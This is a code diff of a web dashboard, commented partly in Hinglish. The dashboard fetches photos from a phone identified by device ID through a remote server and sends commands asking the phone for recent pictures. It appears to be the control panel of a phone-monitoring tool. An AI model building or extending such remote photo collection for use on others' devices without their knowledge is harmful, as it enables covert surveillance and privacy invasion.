@@ -50,7 +50,7 @@
             display: flex; align-items: center; gap: 5px;
         }
         .action-btn:hover { background: rgba(0, 243, 255, 0.15); border-color: var(--cyan); color: white; }
-        .action-btn.active { border-color: var(--accent); color: var(--accent); background: rgba(76, 175, 80, 0.1); }
+        .action-btn:active { transform: scale(0.95); }
 
         /* GALLERY GRID */
         .gallery-grid {
@@ -122,7 +122,7 @@
         <div class="gallery-grid" id="galleryContainer">
             <div class="status-msg">
                 <i class="fa-solid fa-spinner fa-spin fa-2x"></i><br><br>
-                Connecting to Device...
+                Waiting for connection...
             </div>
         </div>
     </div>
@@ -134,6 +134,7 @@
     </div>
 
     <script>
+        // ✅ SERVER URL (Isse change mat karna agar Render par hai)
         const API_BASE = 'https://child-v9no.onrender.com';
         
         // 1. URL se ID nikalo
@@ -151,36 +152,53 @@
             loadGallery();
         };
 
-        // 2. Load Gallery
+        // 2. Load Gallery Function (UPDATED)
         async function loadGallery() {
             const container = document.getElementById("galleryContainer");
             container.innerHTML = "<div class='status-msg'><i class='fa-solid fa-spinner fa-spin'></i> Loading Photos...</div>";
 
             try {
+                // Server se data maango
                 const response = await fetch(`${API_BASE}/api/get-data/${DEVICE_ID}/gallery?t=${Date.now()}`);
-                const data = await response.json();
+                
+                if (!response.ok) {
+                    throw new Error("Server Response Error");
+                }
 
+                const data = await response.json();
                 container.innerHTML = ""; 
 
+                // Agar data empty hai
                 if (!data || data.length === 0) {
                     container.innerHTML = `
                         <div class='status-msg'>
                             <i class='fa-regular fa-image fa-3x' style='opacity:0.5'></i><br><br>
                             No photos found yet.<br>
-                            <span style='font-size:0.7rem; color:#666'>Use buttons above to request photos.</span>
+                            <span style='font-size:0.7rem; color:#666'>Click 'Latest 5' to request photos from phone.</span>
                         </div>`;
                     return;
                 }
 
+                // Loop through photos
                 data.forEach(item => {
                     const card = document.createElement("div");
                     card.className = "img-card";
                     
-                    const dateStr = new Date(parseInt(item.time)).toLocaleString([], { hour12: true, month: 'short', day: 'numeric', hour: '2-digit', minute:'2-digit' });
-                    const imgSrc = "data:image/jpeg;base64," + item.image;
+                    // Date formatting
+                    let dateStr = "Unknown Date";
+                    if (item.time) {
+                        dateStr = new Date(parseInt(item.time)).toLocaleString([], { hour12: true, month: 'short', day: 'numeric', hour: '2-digit', minute:'2-digit' });
+                    }
+
+                    // 🔥 BASE64 FIX: Check karo header hai ya nahi
+                    let imgSrc = item.image;
+                    if (!imgSrc.startsWith("data:image")) {
+                        // Agar plain base64 string hai, to header jodo
+                        imgSrc = "data:image/jpeg;base64," + item.image;
+                    }
 
                     card.innerHTML = `
-                        <img src="${imgSrc}" loading="lazy">
+                        <img src="${imgSrc}" loading="lazy" alt="Gallery Image">
                         <div class="timestamp-badge">${dateStr}</div>
                     `;
                     
@@ -189,12 +207,12 @@
                 });
 
             } catch (err) {
-                console.error(err);
-                container.innerHTML = "<div class='status-msg' style='color:#ff4444'>Failed to load data.</div>";
+                console.error("Gallery Load Error:", err);
+                container.innerHTML = "<div class='status-msg' style='color:#ff4444'>Failed to load photos.<br>Server might be restarting.</div>";
             }
         }
 
-        // 3. Send Command
+        // 3. Send Command (Request Photos from Android)
         function sendCommand(cmd) {
             if(!DEVICE_ID) return alert("Error: ID missing");
             
@@ -203,11 +221,7 @@
             const originalText = btn.innerHTML;
             btn.innerHTML = `<i class="fa-solid fa-check"></i> Sent`;
             btn.style.color = "var(--accent)";
-            setTimeout(() => { 
-                btn.innerHTML = originalText; 
-                btn.style.color = "var(--text-muted)";
-            }, 2000);
-
+            
             fetch(`${API_BASE}/api/send-command`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -215,9 +229,14 @@
             })
             .then(() => console.log("Cmd Sent: " + cmd))
             .catch(() => alert("Failed to send command"));
+
+            setTimeout(() => { 
+                btn.innerHTML = originalText; 
+                btn.style.color = "var(--text-muted)";
+            }, 2000);
         }
 
-        // 4. Modal Functions
+        // 4. Modal Functions (Zoom View)
         function openPreview(src, date) {
             document.getElementById('pvImg').src = src;
             document.getElementById('pvDate').innerText = date;
